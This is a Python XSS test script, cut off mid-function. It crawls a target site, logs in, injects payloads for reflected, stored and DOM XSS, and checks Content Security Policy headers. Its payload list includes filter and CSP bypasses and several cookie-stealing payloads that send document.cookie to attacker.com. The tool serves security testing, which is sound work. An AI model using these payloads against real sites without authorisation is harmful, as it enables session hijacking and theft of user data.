#!/usr/bin/env python
"""
Cross-Site Scripting (XSS) Test Script

This script tests the application's resistance to Cross-Site Scripting attacks by
attempting various XSS payloads in different input fields and URLs.

The script checks:
1. Reflected XSS in URL parameters
2. Stored XSS in form submissions
3. DOM-based XSS vulnerabilities
4. Content Security Policy (CSP) effectiveness

Usage:
    python xss_test.py [target_url] [username] [password]

Example:
    python xss_test.py https://localhost:8000/ admin password123
"""

import requests
import sys
import time
import re
import os
import json
import urllib.parse
import logging
import uuid
from urllib3.exceptions import InsecureRequestWarning
from bs4 import BeautifulSoup
from tabulate import tabulate
from selenium import webdriver
from selenium.webdriver.chrome.options import Options
from selenium.webdriver.chrome.service import Service as ChromeService
from selenium.webdriver.common.by import By
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
from selenium.common.exceptions import TimeoutException, WebDriverException
import tempfile

# Suppress only the single InsecureRequestWarning
requests.packages.urllib3.disable_warnings(category=InsecureRequestWarning)

# Configure logging
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(levelname)s - %(message)s',
    handlers=[
        logging.StreamHandler(),
        logging.FileHandler('xss_test.log')
    ]
)
logger = logging.getLogger(__name__)

class XSSTest:
    def __init__(self, target_url, username=None, password=None):
        self.target_url = target_url.rstrip('/')
        self.username = username
        self.password = password
        self.session = requests.Session()
        self.authenticated = False
        self.timeout = 15  # Request timeout in seconds
        self.test_id = str(uuid.uuid4().hex)[:8]  # Unique identifier for this test run
        
        # Load XSS payloads
        self.payloads = self._load_payloads()
        
        # Selenium WebDriver for DOM XSS testing
        self.driver = None
        
        # Initialize results
        self.results = {
            'reflected': [],
            'stored': [],
            'dom': [],
            'csp': {}
        }

    def __del__(self):
        """Clean up resources"""
        if self.driver:
            try:
                self.driver.quit()
            except:
                pass

    def _load_payloads(self):
        """Load XSS payloads from file or use defaults"""
        # Default payloads if file is not available
        default_payloads = {
            'basic': [
                "<script>alert('XSS')</script>",
                "<script>alert(document.cookie)</script>",
                "<img src=x onerror=alert('XSS')>",
                "<img src=x onerror=alert(document.cookie)>",
                "<svg onload=alert('XSS')>",
                "<body onload=alert('XSS')>",
                "<input autofocus onfocus=alert('XSS')>",
                "<video src=1 onerror=alert('XSS')>",
                "<audio src=1 onerror=alert('XSS')>"
            ],
            'advanced': [
                "<script>fetch('https://attacker.com/steal?cookie='+document.cookie)</script>",
                "<img src=x onerror=fetch('https://attacker.com/steal?cookie='+document.cookie)>",
                "<script>new Image().src='https://attacker.com/steal?cookie='+document.cookie;</script>",
                "<script>var xss=new XMLHttpRequest();xss.open('GET','https://attacker.com/steal?cookie='+document.cookie,true);xss.send();</script>"
            ],
            'bypass': [
                "<ScRiPt>alert('XSS')</ScRiPt>",
                "<script>alert\\u0028'XSS'\\u0029</script>",
                "<img src=x onerror=alert`XSS`>",
                "<svg/onload=alert('XSS')>",
                "<body/onload=alert('XSS')>",
                "javascript:alert('XSS')",
                "<script>a='XS';b='S';alert(a+b)</script>",
                "<script src=data:text/javascript,alert('XSS')></script>",
                "<div onclick=\"alert('XSS')\"style=position:fixed;top:0;left:0;width:100%;height:100%;></div>",
                "<details open ontoggle=alert('XSS')>",
                "<iframe srcdoc=\"<svg onload=alert('XSS')>\">",
            ],
            'dom': [
                "javascript:alert(1)",
                "#<script>alert('XSS')</script>",
                "#<img src=x onerror=alert('XSS')>",
                "?test=<script>alert('XSS')</script>",
                "?test=<img src=x onerror=alert('XSS')>",
                "?test=<svg onload=alert('XSS')>",
                "?q=<script>alert(document.domain)</script>"
            ],
            'csp_bypass': [
                "<script nonce='random123'>alert('XSS with nonce')</script>",
                "<script nonce='{{csp-nonce}}'>alert('XSS with nonce template')</script>",
                "<object data='data:text/html,<script>alert(document.domain)</script>'></object>",
                "<embed src='data:text/html,<script>alert(document.domain)</script>'>",
                "<iframe src='data:text/html,<script>alert(document.domain)</script>'></iframe>"
            ]
        }
        
        # Try to load payloads from file
        try:
            payloads_file = os.path.join(os.path.dirname(__file__), "xss_payloads.json")
            if os.path.exists(payloads_file):
                with open(payloads_file, 'r') as f:
                    return json.load(f)
            else:
                # Create the payloads file for future use
                with open(payloads_file, 'w') as f:
                    json.dump(default_payloads, f, indent=2)
        except Exception as e:
            logger.error(f"Error loading payloads file: {e}")
        
        return default_payloads

    def _get_csrf_token(self, response):
        """Extract CSRF token from the response"""
        try:
            # Try to find the CSRF token in the HTML
            csrf = re.search('name="csrfmiddlewaretoken" value="(.+?)"', response.text)
            if csrf:
                return csrf.group(1)
            
            # Try to find it in the cookies
            if 'csrftoken' in self.session.cookies:
                return self.session.cookies['csrftoken']
                
            return None
        except Exception as e:
            logger.error(f"Error extracting CSRF token: {e}")
            return None

    def _initialize_webdriver(self):
        """Initialize Selenium WebDriver for DOM XSS testing"""
        if self.driver:
            return True
            
        try:
            # Setup Chrome options
            chrome_options = Options()
            chrome_options.add_argument("--headless")
            chrome_options.add_argument("--no-sandbox")
            chrome_options.add_argument("--disable-dev-shm-usage")
            chrome_options.add_argument("--disable-gpu")
            chrome_options.add_argument("--disable-infobars")
            chrome_options.add_argument("--disable-extensions")
            chrome_options.add_argument("--disable-notifications")
            chrome_options.add_argument("--disable-popup-blocking")
            
            # Initialize Chrome WebDriver
            self.driver = webdriver.Chrome(options=chrome_options)
            self.driver.set_page_load_timeout(20)
            return True
            
        except Exception as e:
            logger.error(f"Error initializing WebDriver: {e}")
            logger.warning("DOM XSS testing will be skipped. Make sure you have Chrome and ChromeDriver installed.")
            return False

    def login(self):
        """Attempt to log in with the provided credentials"""
        if not self.username or not self.password:
            logger.warning("Username or password not provided. Skipping login.")
            return False
        
        login_url = f"{self.target_url}/login/"
        
        try:
            # Get the login page to extract CSRF token
            response = self.session.get(login_url, verify=False, timeout=self.timeout)
            
            if response.status_code != 200:
                logger.error(f"Error accessing login page. Status code: {response.status_code}")
                return False

            # Extract CSRF token
            csrf_token = self._get_csrf_token(response)
            if not csrf_token:
                logger.warning("Could not extract CSRF token. Proceeding without it.")
            
            # Prepare login data
            login_data = {
                'username': self.username,
                'password': self.password
            }
            
            if csrf_token:
                login_data['csrfmiddlewaretoken'] = csrf_token
            
            # Add captcha if needed (we'll use a dummy value)
            if 'captcha' in response.text.lower():
                logger.warning("CAPTCHA detected. Login may fail.")
                login_data['captcha'] = '12345'  # Dummy value

            # Submit login form
            login_response = self.session.post(
                login_url,
                data=login_data,
                headers={'Referer': login_url},
                verify=False,
                timeout=self.timeout,
                allow_redirects=True
            )
            
            # Check if login was successful
            if "logout" in login_response.text.lower() or "dashboard" in login_response.text.lower():
                logger.info("Logged in successfully.")
                self.authenticated = True
                return True
            else:
                logger.warning("Login failed. Continuing without authentication.")
                return False
            
        except Exception as e:
            logger.error(f"Error during login: {e}")
            return False

    def test_reflected_xss(self):
        """Test for reflected XSS vulnerabilities in URL parameters and search forms"""
        logger.info("\n[*] Testing for reflected XSS vulnerabilities...")
        
        # Find search forms and URLs with parameters
        entry_points = self._find_xss_entry_points()
        
        if not entry_points:
            logger.warning("No potential XSS entry points found.")
            return
        
        # Login if credentials are provided
        if not self.authenticated and self.username and self.password:
            self.login()
        
        # Test each entry point
        for url, method, params in entry_points:
            logger.info(f"Testing entry point: {url} ({method} method)")
            
            for param in params:
                logger.info(f"Testing parameter: {param}")
                
                # Basic payloads
                for i, payload in enumerate(self.payloads['basic']):
                    logger.info(f"Testing basic payload {i+1}/{len(self.payloads['basic'])}")
                    
                    # Add unique identifier to help with detection
                    tagged_payload = payload.replace("XSS", f"XSS-{self.test_id}")
                    
                    # Test the payload
                    result = self._test_xss_payload(url, method, param, tagged_payload)
                    
                    if result and result['vulnerable']:
                        logger.warning(f"Basic XSS vulnerability found at {url} in parameter {param}")
                        self.results['reflected'].append(result)
                        # Try advanced payloads for better bypass
                        self._test_advanced_payloads(url, method, param)
                        break
                
                # If not vulnerable to basic payloads, try bypass payloads
                if not any(r['vulnerable'] and r['parameter'] == param and r['url'] == url for r in self.results['reflected']):
                    for i, payload in enumerate(self.payloads['bypass']):
                        logger.info(f"Testing bypass payload {i+1}/{len(self.payloads['bypass'])}")
                        
                        # Add unique identifier to help with detection
                        tagged_payload = payload.replace("XSS", f"XSS-{self.test_id}")
                        
                        # Test the payload
                        result = self._test_xss_payload(url, method, param, tagged_payload)
                        
                        if result and result['vulnerable']:
                            logger.warning(f"Bypass XSS vulnerability found at {url} in parameter {param}")
                            self.results['reflected'].append(result)
                            self._test_advanced_payloads(url, method, param)
                            break

    def _test_xss_payload(self, url, method, param, payload):
        """Test a specific XSS payload against a URL parameter"""
        try:
            # Prepare request data
            data = {p: "test" for p in param} if isinstance(param, list) else {param: payload}
            
            # Send request
            if method.upper() == 'GET':
                # For GET requests, URL encode the payload and add to parameters
                response = self.session.get(
                    url,
                    params=data,
                    verify=False,
                    timeout=self.timeout,
                    allow_redirects=True
                )
            else:  # POST
                # Get CSRF token if needed
                form_response = self.session.get(url, verify=False, timeout=self.timeout)
                csrf_token = self._get_csrf_token(form_response)
                if csrf_token:
                    data['csrfmiddlewaretoken'] = csrf_token
                
                # Send POST request
                response = self.session.post(
                    url,
                    data=data,
                    headers={'Referer': url},
                    verify=False,
                    timeout=self.timeout,
                    allow_redirects=True
                )
            
            # Check if the payload was reflected without encoding
            has_reflection = False
            has_script_execution = False
            
            # Check for unencoded script tags
            if "<script>" in payload.lower() and "<script>" in response.text.lower():
                has_reflection = True
            
            # Check for other payload elements
            elif any(marker in payload.lower() and marker in response.text.lower() 
                    for marker in ["onerror=", "onload=", "onfocus=", "onclick=", "alert("]):
                has_reflection = True
            
            # Check for our unique test identifier
            if f"XSS-{self.test_id}" in response.text:
                has_reflection = True
            
            # If reflected, check the CSP headers
            csp_blocked = False
            if has_reflection:
                if 'Content-Security-Policy' in response.headers:
                    csp_header = response.headers['Content-Security-Policy']
                    if "'unsafe-inline'" not in csp_header and "'unsafe-eval'" not in csp_header:
                        if "script-src" in csp_header and "script-src 'none'" not in csp_header:
                            csp_blocked = self._check_csp_effectiveness(csp_header)
                
                # Record CSP details
                self.results['csp'][url] = {
                    'has_csp': 'Content-Security-Policy' in response.headers,
                    'csp_header': response.headers.get('Content-Security-Policy', None),
                    'effective': csp_blocked
                }
            
            # Save response to a temporary file for Selenium test
            if has_reflection and not csp_blocked:
                with tempfile.NamedTemporaryFile(suffix='.html', delete=False) as tmp:
                    tmp.write(response.content)
                    tmp_path = tmp.name
                
                # Test actual JavaScript execution using Selenium if available
                if self._initialize_webdriver():
                    has_script_execution = self._check_xss_execution(tmp_path, payload)
                    
                    # Clean up temp file
                    try:
                        os.unlink(tmp_path)
                    except:
                        pass
            
            # Return result
            return {
                'url': url,
                'method': method,
                'parameter': param,
                'payload': payload,
                'status_code': response.status_code,
                'has_reflection': has_reflection,
                'has_script_execution': has_script_execution,
                'csp_blocked': csp_blocked,
                'vulnerable': has_reflection and not csp_blocked and (has_script_execution or not self.driver)
            }
            
        except Exception as e:
            logger.error(f"Error testing XSS payload: {e}")
            return None

    def _check_xss_execution(self, html_file, payload):
        """Check if XSS payload actually executes JavaScript using Selenium"""
        try:
            # Create a script to inject that will signal successful execution
            detection_script = """
            <script>
            window.xssExecuted = true;
            </script>
            """
            
            # Add detection script to the HTML file
            with open(html_file, 'r') as f:
                content = f.read()
            
            with open(html_file, 'w') as f:
                f.write(content + detection_script)
            
            # Load the file in the browser
            self.driver.get(f"file://{html_file}")
            
            # Wait for page to load
            WebDriverWait(self.driver, 5).until(
                EC.presence_of_element_located((By.TAG_NAME, "body"))
            )
            
            # Check if JavaScript executed (look for alerts, etc)
            try:
                # Check for our detection variable
                has_execution = self.driver.execute_script("return window.xssExecuted === true;")
                return has_execution
            except:
                return False
                
        except TimeoutException:
            logger.warning("Timeout while checking XSS execution")
            return False
        except WebDriverException as e:
            logger.error(f"WebDriver error: {e}")
            return False
        except Exception as e:
            logger.error(f"Error checking XSS execution: {e}")
            return False

    def _test_advanced_payloads(self, url, method, param):
        """Test advanced XSS payloads after a basic vulnerability is found"""
        logger.info(f"Testing advanced payloads for {url}, parameter {param}...")
        
        # Test advanced payloads
        for i, payload in enumerate(self.payloads['advanced']):
            logger.info(f"Testing advanced payload {i+1}/{len(self.payloads['advanced'])}")
            
            # Add unique identifier to help with detection
            tagged_payload = payload.replace("XSS", f"XSS-{self.test_id}")
            
            # Test the payload
            result = self._test_xss_payload(url, method, param, tagged_payload)
            
            if result and result['vulnerable']:
                logger.warning(f"Advanced XSS vulnerability found at {url} in parameter {param}")
                self.results['reflected'].append(result)
                break
        
        # Test CSP bypasses if CSP is detected
        if url in self.results['csp'] and self.results['csp'][url]['has_csp']:
            logger.info(f"Testing CSP bypasses for {url}...")
            
            for i, payload in enumerate(self.payloads['csp_bypass']):
                logger.info(f"Testing CSP bypass payload {i+1}/{len(self.payloads['csp_bypass'])}")
                
                # Add unique identifier to help with detection
                tagged_payload = payload.replace("XSS", f"XSS-{self.test_id}")
                
                # Test the payload
                result = self._test_xss_payload(url, method, param, tagged_payload)
                
                if result and result['vulnerable']:
                    logger.warning(f"CSP bypass found at {url} in parameter {param}")
                    self.results['reflected'].append(result)
                    break

    def test_stored_xss(self):
        """Test for stored XSS vulnerabilities in forms"""
        logger.info("\n[*] Testing for stored XSS vulnerabilities...")
        
        # Login if credentials are provided
        if not self.authenticated and self.username and self.password:
            self.login()
        
        # Find forms that might store data
        forms = self._find_storage_forms()
        
        if not forms:
            logger.warning("No forms found that might store data.")
            return
        
        # Test each form
        for form_url, method, form_fields in forms:
            logger.info(f"Testing form: {form_url} ({method} method)")
            
            # Test payload in each text field
            for field in form_fields:
                if field.get('type', '') in ['text', 'textarea', 'search', 'url', 'email', 'tel', 'hidden']:
                    field_name = field.get('name', '')
                    
                    if not field_name:
                        continue
                    
                    logger.info(f"Testing field: {field_name}")
                    
                    # Basic payloads
                    for i, payload in enumerate(self.payloads['basic']):
                        if i > 2:  # Limit to first few payloads to avoid too many submissions
                            break
                            
                        logger.info(f"Testing basic payload {i+1}/3")
                        
                        # Add unique identifier to help with detection
                        tagged_payload = payload.replace("XSS", f"XSS-{self.test_id}")
                        
                        # Submit the form
                        submission_result = self._submit_form_with_payload(form_url, method, form_fields, field_name, tagged_payload)
                        
                        if submission_result:
                            # Check pages where stored data might be displayed
                            storage_check = self._check_stored_xss(tagged_payload)
                            
                            if storage_check['found']:
                                logger.warning(f"Stored XSS vulnerability found via {form_url}, field {field_name}")
                                
                                result = {
                                    'url': form_url,
                                    'method': method,
                                    'field': field_name,
                                    'payload': payload,
                                    'stored_url': storage_check['url'],
                                    'vulnerable': True
                                }
                                
                                self.results['stored'].append(result)
                                break

    def _submit_form_with_payload(self, form_url, method, form_fields, target_field, payload):
        """Submit a form with XSS payload in the specified field"""
        try:
            # Get the form page to extract CSRF token
            form_response = self.session.get(form_url, verify=False, timeout=self.timeout)
            csrf_token = self._get_csrf_token(form_response)
            
            # Prepare form data
            form_data = {}
            
            # Add CSRF token if found
            if csrf_token:
                form_data['csrfmiddlewaretoken'] = csrf_token
            
            # Fill required fields
            for field in form_fields:
                field_name = field.get('name', '')
                field_type = field.get('type', 'text')
                
                if not field_name:
                    continue
                
                if field_name == target_field:
                    # This is our target field, insert the payload
                    form_data[field_name] = payload
                elif field_type in ['text', 'textarea', 'search', 'email', 'tel', 'url', 'password']:
                    # Fill text fields with dummy values
                    if 'email' in field_name.lower() or field_type == 'email':
                        form_data[field_name] = 'test@example.com'
                    elif 'password' in field_name.lower() or field_type == 'password':
                        form_data[field_name] = 'Password123!'
                    elif 'phone' in field_name.lower() or field_type == 'tel':
                        form_data[field_name] = '1234567890'
                    elif 'address' in field_name.lower():
                        form_data[field_name] = '123 Test St'
                    elif 'city' in field_name.lower():
                        form_data[field_name] = 'Test City'
                    elif 'zip' in field_name.lower() or 'postal' in field_name.lower():
                        form_data[field_name] = '12345'
                    elif 'country' in field_name.lower():
                        form_data[field_name] = 'Test Country'
                    else:
                        form_data[field_name] = 'Test123'
                elif field_type == 'checkbox':
                    form_data[field_name] = 'on'
                elif field_type == 'select':
                    # Try to find a valid option
                    if 'options' in field and field['options']:
                        form_data[field_name] = field['options'][0]
                    else:
                        form_data[field_name] = ''
            
            # Submit the form
            if method.upper() == 'GET':
                submission_response = self.session.get(
                    form_url,
                    params=form_data,
                    verify=False,
                    timeout=self.timeout,
                    allow_redirects=True
                )
            else:  # POST
                submission_response = self.session.post(
                    form_url,
                    data=form_data,
                    headers={'Referer': form_url},
                    verify=False,
                    timeout=self.timeout,
                    allow_redirects=True
                )
            
            # Check if submission was successful
            if submission_response.status_code in [200, 201, 302]:
                logger.info(f"Form submission successful")
                return True
            else:
                logger.warning(f"Form submission failed with status code {submission_response.status_code}")
                return False
            
        except Exception as e:
            logger.error(f"Error submitting form: {e}")
            return False

    def _check_stored_xss(self, payload_identifier):
        """Check various pages to see if stored XSS payload is displayed"""
        # Pages to check for stored content
        pages_to_check = [
            f"{self.target_url}/",
            f"{self.target_url}/profile/",
            f"{self.target_url}/account/",
            f"{self.target_url}/dashboard/",
            f"{self.target_url}/catalog/",
            f"{self.target_url}/cart/",
            f"{self.target_url}/orders/",
            f"{self.target_url}/comments/",
            f"{self.target_url}/reviews/"
        ]
        
        for page_url in pages_to_check:
            try:
                response = self.session.get(page_url, verify=False, timeout=self.timeout)
                
                if response.status_code != 200:
                    continue
                
                # Check if our payload identifier is in the response
                if payload_identifier in response.text:
                    logger.info(f"Stored payload found on page: {page_url}")
                    
                    # Save response to a temporary file for execution check
                    with tempfile.NamedTemporaryFile(suffix='.html', delete=False) as tmp:
                        tmp.write(response.content)
                        tmp_path = tmp.name
                    
                    # Test actual JavaScript execution if WebDriver is available
                    has_execution = False
                    if self._initialize_webdriver():
                        has_execution = self._check_xss_execution(tmp_path, payload_identifier)
                        
                        # Clean up temp file
                        try:
                            os.unlink(tmp_path)
                        except:
                            pass
                    
                    return {
                        'found': True,
                        'url': page_url,
                        'has_execution': has_execution
                    }
            
            except Exception as e:
                logger.error(f"Error checking page {page_url}: {e}")
                continue
        
        return {'found': False}

    def test_dom_xss(self):
        """Test for DOM-based XSS vulnerabilities"""
        logger.info("\n[*] Testing for DOM-based XSS vulnerabilities...")
        
        # Check if WebDriver is available
        if not self._initialize_webdriver():
            logger.warning("Skipping DOM XSS testing due to missing WebDriver.")
            return
        
        # Login if credentials are provided
        if not self.authenticated and self.username and self.password:
            self.login()
        
        # Test DOM payloads
        for i, payload in enumerate(self.payloads['dom']):
            logger.info(f"Testing DOM payload {i+1}/{len(self.payloads['dom'])}")
            
            # Determine if it's a hash or query parameter
            if payload.startswith('#'):
                test_url = f"{self.target_url}/{payload}"
            elif payload.startswith('?'):
                test_url = f"{self.target_url}/{payload}"
            elif payload.startswith('javascript:'):
                test_url = f"{self.target_url}"  # We'll use this separately
            else:
                test_url = f"{self.target_url}/?param={urllib.parse.quote(payload)}"
            
            try:
                # Load cookies from requests session
                self.driver.get(self.target_url)
                for cookie in self.session.cookies:
                    self.driver.add_cookie({
                        'name': cookie.name,
                        'value': cookie.value,
                        'path': cookie.path,
                        'domain': cookie.domain if cookie.domain else None,
                        'secure': cookie.secure,
                        'httpOnly': cookie.has_nonstandard_attr('httponly')
                    })
                
                # Test JavaScript protocol handler if relevant
                if payload.startswith('javascript:'):
                    try:
                        self.driver.get(self.target_url)
                        self.driver.execute_script(f"{payload.replace('javascript:', '')}")
                        
                        # Check if alert was triggered
                        alert_present = False
                        try:
                            alert = self.driver.switch_to.alert
                            alert.accept()
                            alert_present = True
                        except:
                            pass
                        
                        if alert_present:
                            logger.warning(f"DOM XSS vulnerability found with JavaScript URL scheme")
                            self.results['dom'].append({
                                'payload': payload,
                                'url': self.target_url,
                                'vulnerable': True,
                                'notes': 'JavaScript URL scheme executed successfully'
                            })
                        
                    except Exception as e:
                        logger.info(f"JavaScript URL scheme test failed: {e}")
                    
                    continue
                
                # Load the URL with the payload
                logger.info(f"Testing URL: {test_url}")
                self.driver.get(test_url)
                
                # Check for alert
                alert_present = False
                try:
                    WebDriverWait(self.driver, 3).until(EC.alert_is_present())
                    alert = self.driver.switch_to.alert
                    alert_present = True
                    alert_text = alert.text
                    logger.warning(f"Alert detected with text: {alert_text}")
                    alert.accept()
                except TimeoutException:
                    pass
                
                if alert_present:
                    logger.warning(f"DOM XSS vulnerability found at {test_url}")
                    self.results['dom'].append({
                        'payload': payload,
                        'url': test_url,
                        'vulnerable': True
                    })
                
                # Check for other signs of JavaScript execution
                try:
                    # Inject a detection script
                    self.driver.execute_script("window.domXssExecuted = true;")
                    has_execution = self.driver.execute_script("return window.domXssExecuted === true;")
                    
                    if has_execution:
                        logger.info(f"JavaScript can be executed in the page context")
                except Exception as e:
                    logger.error(f"Error checking for JavaScript execution: {e}")
                
            except Exception as e:
                logger.error(f"Error testing DOM XSS payload: {e}")
                continue

    def test_csp_effectiveness(self):
        """Analyze Content Security Policy headers and effectiveness"""
        logger.info("\n[*] Analyzing Content Security Policy effectiveness...")
        
        # Check if we have CSP data from other tests
        if not self.results['csp']:
            # Get CSP headers from home page
            try:
                response = self.session.get(self.target_url, verify=False, timeout=self.timeout)
                
                if 'Content-Security-Policy' in response.headers:
                    csp_header = response.headers['Content-Security-Policy']
                    self.results['csp'][self.target_url] = {
                        'has_csp': True,
                        'csp_header': csp_header,
                        'effective': self._check_csp_effectiveness(csp_header)
                    }
                else:
                    self.results['csp'][self.target_url] = {
                        'has_csp': False,
                        'csp_header': None,
                        'effective': False
                    }
            except Exception as e:
                logger.error(f"Error checking CSP header: {e}")
        
        # Analyze the CSP data
        for url, csp_data in self.results['csp'].items():
            logger.info(f"\nCSP Analysis for {url}:")
            
            if not csp_data['has_csp']:
                logger.warning("No Content-Security-Policy header found")
                continue
            
            logger.info(f"CSP Header: {csp_data['csp_header']}")
            
            # Parse the CSP directives
            directives = self._parse_csp(csp_data['csp_header'])
            
            # Check for script-src directive
            if 'script-src' in directives:
                script_sources = directives['script-src']
                logger.info(f"script-src directive: {script_sources}")
                
                if "'unsafe-inline'" in script_sources:
                    logger.warning("CSP allows 'unsafe-inline' scripts which is vulnerable to XSS")
                
                if "'unsafe-eval'" in script_sources:
                    logger.warning("CSP allows 'unsafe-eval' which is vulnerable to XSS")
                
                if "*" in script_sources:
                    logger.warning("CSP allows scripts from any source (*) which is vulnerable")
                
                if "'none'" in script_sources and len(script_sources) == 1:
                    logger.info("CSP blocks all scripts (script-src 'none') which is secure")
                
                if "'self'" in script_sources and len(script_sources) == 1:
                    logger.info("CSP only allows same-origin scripts which is relatively secure")
                
            else:
                # Check if default-src is defined
                if 'default-src' in directives:
                    default_sources = directives['default-src']
                    logger.info(f"default-src directive (applies to scripts): {default_sources}")
                    
                    if "'unsafe-inline'" in default_sources:
                        logger.warning("CSP allows 'unsafe-inline' scripts via default-src which is vulnerable to XSS")
                    
                    if "'unsafe-eval'" in default_sources:
                        logger.warning("CSP allows 'unsafe-eval' via default-src which is vulnerable to XSS")
                    
                    if "*" in default_sources:
                        logger.warning("CSP allows scripts from any source (*) via default-src which is vulnerable")
                    
                else:
                    logger.warning("No script-src or default-src directive found, which means scripts are not restricted")
            
            # Check for object-src directive
            if 'object-src' not in directives and 'default-src' not in directives:
                logger.warning("No object-src or default-src directive found, allowing <object>, <embed>, and <applet> elements")
            
            # Check for base-uri directive
            if 'base-uri' not in directives:
                logger.warning("No base-uri directive found, allowing attacker to control relative URLs via <base> element")
            
            # Overall assessment
            if csp_data['effective']:
                logger.info("CSP appears to be effective against basic XSS attacks")
            else:
                logger.warning("CSP appears to be ineffective or insufficient against XSS attacks")

    def _check_csp_effectiveness(self, csp_header):
        """Check if CSP header is effective against XSS"""
        # Parse the CSP header
        directives = self._parse_csp(csp_header)
        
        # Check script-src directive
        script_sources = []
        if 'script-src' in directives:
            script_sources = directives['script-src']
        elif 'default-src' in directives:
            script_sources = directives['default-src']
        else:
            return False  # No script restrictions
        
        # Check for unsafe directives
        if "'unsafe-inline'" in script_sources:
            return False
        
        if "'unsafe-eval'" in script_sources:
            return False
        
        if "*" in script_sources:
            return False
        
        # If we got here, CSP might be effective
        return True

    def _parse_csp(self, csp_header):
        """Parse CSP header into directives"""
        directives = {}
        
        # Split by semicolons
        parts = csp_header.split(';')
        
        for part in parts:
            part = part.strip()
            if not part:
                continue
            
            # Split directive name and values
            pieces = part.split(None, 1)
            directive_name = pieces[0].lower()
            
            if len(pieces) > 1:
                # Split values by spaces
                values = pieces[1].split()
                directives[directive_name] = values
            else:
                directives[directive_name] = []
        
        return directives

    def _find_xss_entry_points(self):
        """Find potential XSS entry points like search forms and URL parameters"""
        entry_points = []
        
        try:
            # Find search forms
            search_forms = self._find_search_forms()
            entry_points.extend(search_forms)
            
            # Find URLs with parameters
            param_urls = self._find_urls_with_parameters()
            
            for url in param_urls:
                # Parse URL and parameters
                parsed_url = urllib.parse.urlparse(url)
                query_params = urllib.parse.parse_qs(parsed_url.query)
                
                # Add each parameter as a potential entry point
                entry_points.append((url, 'GET', list(query_params.keys())))
            
        except Exception as e:
            logger.error(f"Error finding XSS entry points: {e}")
        
        return entry_points

    def _find_search_forms(self):
        """Find search forms in the site"""
        search_forms = []
        
        try:
            # Try to visit the home page and catalog page
            for url in [self.target_url, f"{self.target_url}/catalog/", f"{self.target_url}/search/"]:
                response = self.session.get(url, verify=False, timeout=self.timeout)
                
                if response.status_code != 200:
                    continue
                
                # Parse the HTML
                soup = BeautifulSoup(response.text, 'html.parser')
                
                # Find all forms
                forms = soup.find_all('form')
                
                for form in forms:
                    # Check if it's likely a search form
                    inputs = form.find_all('input')
                    is_search = False
                    
                    # Check form attributes
                    if form.get('id') and 'search' in form.get('id').lower():
                        is_search = True
                    elif form.get('class') and any('search' in c.lower() for c in form.get('class')):
                        is_search = True
                    elif form.get('action') and 'search' in form.get('action').lower():
                        is_search = True
                    
                    # Check input attributes
                    for input_tag in inputs:
                        if input_tag.get('name') and input_tag.get('name').lower() in ['q', 'query', 'search', 'keyword', 'keywords', 'term']:
                            is_search = True
                        elif input_tag.get('placeholder') and 'search' in input_tag.get('placeholder').lower():
                            is_search = True
                    
                    if is_search:
                        # Get form action and method
                        action = form.get('action')
                        method = form.get('method', 'GET').upper()
                        
                        # Build the full URL
                        if not action:
                            form_url = url
                        elif action.startswith('/'):
                            form_url = f"{self.target_url}{action}"
                        elif action.startswith('http'):
                            form_url = action
                        else:
                            form_url = f"{url.rstrip('/')}/{action.lstrip('/')}"
                        
                        # Get form parameters
                        params = []
                        for input_tag in inputs:
                            name = input_tag.get('name')
                            if name and name.lower() not in ['csrfmiddlewaretoken', 'submit']:
                                params.append(name)
                        
                        if params:
                            search_forms.append((form_url, method, params))
        
        except Exception as e:
            logger.error(f"Error finding search forms: {e}")
        
        return search_forms

    def _find_urls_with_parameters(self):
        """Find URLs with parameters in the site"""
        param_urls = []
        visited = set()
        
        try:
            # Start with home page
            urls_to_visit = [self.target_url]
            
            while urls_to_visit and len(visited) < 10:  # Limit to 10 pages
                url = urls_to_visit.pop(0)
                
                if url in visited or not url.startswith(self.target_url):
                    continue
                
                visited.add(url)
                
                # Check if URL has parameters
                if '?' in url:
                    param_urls.append(url)
                
                # Visit the page and look for more links
                try:
                    response = self.session.get(url, verify=False, timeout=self.timeout)
                    
                    if response.status_code != 200:
                        continue
                    
                    # Parse the HTML
                    soup = BeautifulSoup(response.text, 'html.parser')
                    
                    # Find all links
                    for a_tag in soup.find_all('a', href=True):
                        href = a_tag['href']
                        
                        # Build the full URL
                        if href.startswith('/'):
                            full_url = f"{self.target_url}{href}"
                        elif href.startswith('http'):
                            full_url = href
                        else:
                            full_url = f"{url.rstrip('/')}/{href.lstrip('/')}"
                        
                        # Check if URL has parameters
                        if '?' in full_url and full_url not in visited and full_url.startswith(self.target_url):
                            param_urls.append(full_url)
                            urls_to_visit.append(full_url)
                    
                except Exception as e:
                    logger.error(f"Error visiting URL {url}: {e}")
                    continue
        
        except Exception as e:
            logger.error(f"Error finding URLs with parameters: {e}")
        
        return param_urls

    def _find_storage_forms(self):
        """Find forms that might store data (comments, reviews, profiles, etc.)"""
        storage_forms = []
        
        try:
            # Pages that might contain forms
            pages_to_check = [
                self.target_url,
                f"{self.target_url}/profile/",
                f"{self.target_url}/account/",
                f"{self.target_url}/comment/",
                f"{self.target_url}/review/",
                f"{self.target_url}/contact/",
                f"{self.target_url}/feedback/",
                f"{self.target_url}/create/",
                f"{self.target_url}/edit/",
                f"{self.target_url}/payment/"
            ]
            
            for url in pages_to_check:
                try:
                    response = self.session.get(url, verify=False, timeout=self.timeout)
                    
                    if response.status_code != 200:
                        continue
                    
                    # Parse the HTML
                    soup = BeautifulSoup(response.text, 'html.parser')
                    
                    # Find all forms
                    forms = soup.find_all('form')
                    
                    for form in forms:
                        # Get form action and method
                        action = form.get('action')
                        method = form.get('method', 'POST').upper()
                        
                        # Skip login and search forms
                        if form.get('id') and 'login' in form.get('id').lower():
                            continue
                        if form.get('id') and 'search' in form.get('id').lower():
                            continue
                        
                        # Build the full URL
                        if not action:
                            form_url = url
                        elif action.startswith('/'):
                            form_url = f"{self.target_url}{action}"
                        elif action.startswith('http'):
                            form_url = action
                        else:
                            form_url = f"{url.rstrip('/')}/{action.lstrip('/')}"
                        
                        # Get form fields
                        fields = []
                        for input_tag in form.find_all('input'):
                            field = {
                                'name': input_tag.get('name'),
                                'type': input_tag.get('type', 'text')
                            }
                            fields.append(field)
                        
                        for textarea in form.find_all('textarea'):
                            field = {
                                'name': textarea.get('name'),
                                'type': 'textarea'
                            }
                            fields.append(field)
                        
                        for select in form.find_all('select'):
                            options = [option.get('value') for option in select.find_all('option') if option.get('value')]
                            field = {
                                'name': select.get('name'),
                                'type': 'select',
